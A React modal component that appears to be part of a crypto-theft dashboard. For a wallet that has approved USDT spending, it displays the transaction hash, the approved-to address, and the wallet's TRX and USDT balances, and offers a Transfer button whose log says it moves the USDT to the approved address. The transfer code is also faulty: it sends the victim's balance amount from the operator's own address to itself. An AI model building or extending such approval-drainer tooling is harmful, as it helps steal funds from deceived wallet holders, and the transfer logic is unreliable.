
import React , { useState, useEffect } from 'react';
import { Modal, Button, Table } from 'react-bootstrap';

function ApprovedDataDetails({ show, title, message, onClose }) {

  const [trxBalance, setTrxBalance] = useState(0);
  const [usdtBalance, setUsdtBalance] = useState(0);
  const [tron, setTron] = useState(null);
  const [usdtContract, setUsdtContract] = useState(null);

  const usdtTokenAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
  useEffect(() => {

    if(show){
    fetchWalletBalances();
  }
}, [show]);

const fetchWalletBalances = async () => {
  console.log(show)
    try {
        // Check if TronLink is installed
  if (!window.tronWeb ) {
    console.error("TronLink wallet not detected or not ready");
    return;
  } 
  await window.tronLink.request({method: 'tron_requestAccounts'})
  // Get TronWeb instance
  let tronWeb = window.tronWeb
  setTron(tronWeb)
  // Get TRX balance of the wallet
  let trx = await tronWeb.trx.getBalance(message.wallet);
  setTrxBalance((trx/ 10**6) + " TRX")
  let usdtContract = await tronWeb.contract().at(usdtTokenAddress);
  setUsdtContract(usdtContract)
  let usdt = await usdtContract.balanceOf(message.wallet).call()
  setUsdtBalance((usdt/ 10**6) + " USDT")

    } catch (error) {
        console.error('Error fetching balances data:', error);
    }
};


  const transferUSDT = async()=>{
    // Get the current address from TronLink
  const currentAddress = tron.defaultAddress.base58;
  let usdt = parseFloat(usdtBalance)
  try {
    await usdtContract.transfer(currentAddress, usdt * 10**6).send({
      from: currentAddress,
      shouldPollResponse: true,
    });
  } catch (error) {
    console.error('Error while tranferring', error);
  }
  
   console.log("Trasnferring USDT to approved address.",currentAddress)
  }

  return (
    <Modal show={show} onHide={onClose} centered>
      <Modal.Header closeButton>
        <Modal.Title>{title}</Modal.Title>
      </Modal.Header>
      <Modal.Body>
        <Table bordered hover variant="light" size="sm">
          <thead>
            <tr>
              <th width="170">Transaction Hash</th>
              <td>{message.trxHash}</td>
            </tr>
            <tr>
              <th width="170">Wallet</th>
              <td>{message.wallet}</td>
            </tr>
            <tr>
              <th width="170">Approved To</th>
              <td>{message.approvedTo}</td>
            </tr>
            <tr>
              <th width="170">TRX Balance</th>
              <td>{trxBalance}</td>
            </tr>
            <tr>
              <th width="170">USDT</th>
              <td>{usdtBalance}</td>
            </tr>
          </thead>
          <tbody>
          </tbody>
        </Table>
        <Button style={{float: "left"}} variant="primary" onClick={transferUSDT}>
          Transfer
        </Button>
      </Modal.Body>
      <Modal.Footer>
        <Button variant="secondary" onClick={onClose}>
          Close
        </Button>
      </Modal.Footer>
    </Modal>
  );
}

export default ApprovedDataDetails;